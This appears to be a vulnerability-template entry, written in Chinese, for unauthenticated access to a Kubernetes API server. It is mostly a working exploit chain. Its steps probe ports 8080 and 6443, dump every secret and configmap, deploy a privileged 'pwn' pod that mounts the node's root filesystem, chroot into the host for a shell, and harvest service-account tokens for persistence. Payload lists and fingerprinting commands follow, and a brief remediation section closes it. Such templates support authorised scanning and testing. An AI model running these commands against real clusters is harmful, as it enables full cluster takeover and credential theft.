---
id: K8S-APISERVER-UNAUTH
title: Kubernetes API Server 未授权访问
product: kubernetes
vendor: CNCF
version_affected: "all versions"
severity: CRITICAL
tags: [k8s, container, rce, 云原生, 无需认证]
fingerprint: ["Kubernetes", "kubernetes", "k8s", "kubectl", "/api/v1", "kube-apiserver", ":6443", ":8080"]
---

## 漏洞描述

Kubernetes API Server 默认有两个端口：8080（HTTP，无认证无授权）和6443（HTTPS，有认证授权）。如果管理员开启了8080端口或配置了匿名访问，攻击者可未授权控制整个K8s集群，在任意节点创建Pod执行命令。

## 影响版本

- Kubernetes 全版本（配置不当时）

## 前置条件

- 目标开放 8080 端口（HTTP无认证）或 6443 端口（HTTPS匿名访问）
- API Server 启用了非安全端口或允许匿名访问
- 无需认证凭据

## 利用步骤

### Step 1: 探测API Server

```bash
# 未认证端口
curl -s http://target:8080/api/v1/namespaces
curl -s http://target:8080/api/v1/pods
curl -s http://target:8080/version

# 认证端口（匿名访问）
curl -sk https://target:6443/api/v1/namespaces
curl -sk https://target:6443/version
```

### Step 2: 列出集群资源

```bash
# 通过kubectl
kubectl --server=http://target:8080 get nodes
kubectl --server=http://target:8080 get pods --all-namespaces
kubectl --server=http://target:8080 get secrets --all-namespaces

# 通过curl
curl -s http://target:8080/api/v1/secrets
curl -s http://target:8080/api/v1/configmaps
```

### Step 3: 创建恶意Pod获取节点权限

```bash
kubectl --server=http://target:8080 apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwn
spec:
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - mountPath: /host
      name: hostroot
    securityContext:
      privileged: true
  volumes:
  - name: hostroot
    hostPath:
      path: /
      type: Directory
  tolerations:
  - operator: Exists
  hostNetwork: true
  hostPID: true
EOF
```

### Step 4: 在Pod中执行命令

```bash
kubectl --server=http://target:8080 exec -it pwn -- chroot /host bash
```

### Step 5: 获取ServiceAccount Token

```bash
# 读取默认token用于持久化
curl -s http://target:8080/api/v1/namespaces/kube-system/secrets | grep -o '"token":"[^"]*"'
```

## Payload

```bash
# 列出所有命名空间
curl -s http://target:8080/api/v1/namespaces

# 列出所有Pod
curl -s http://target:8080/api/v1/namespaces/default/pods

# 获取所有Secret
curl -s http://target:8080/api/v1/secrets

# HTTPS匿名访问
curl -sk https://target:6443/api/v1/namespaces
```

## 验证方法

```bash
# 8080 非安全端口：看响应体是不是 NamespaceList
curl -s http://target:8080/api/v1/namespaces | head -c 400
# 判据：响应体是 NamespaceList JSON，出现 "kind":"NamespaceList" 与 items[].metadata.name（default、kube-system 等真实命名空间名）
# 反例：响应体是 "kind":"Status" 的 403/401 JSON（Forbidden / Unauthorized），或登录页 HTML，都算需认证

# 6443 匿名访问同理，看响应体
curl -sk https://target:6443/api/v1/namespaces | head -c 400
# 判据：同上，出现 "kind":"NamespaceList" 与 items[].metadata.name

# Pod 列表：看响应体是不是 PodList
curl -s http://target:8080/api/v1/pods | head -c 400
# 判据：响应体是 PodList JSON，出现 "kind":"PodList" 与 items[].metadata.name、items[].spec.containers
# 说明：能拿到资源对象本体才算未授权；/version 只能说明是 K8s，见下方指纹确认
```

## 指纹确认

```bash
curl -sk https://target:6443/version
curl -s http://target:8080/version
nmap -p 6443,8080,10250 target
```

## 修复建议

1. 禁用API Server的8080非安全端口（`--insecure-port=0`）
2. 启用RBAC认证授权
3. 限制API Server网络访问
4. 禁用匿名访问（`--anonymous-auth=false`）
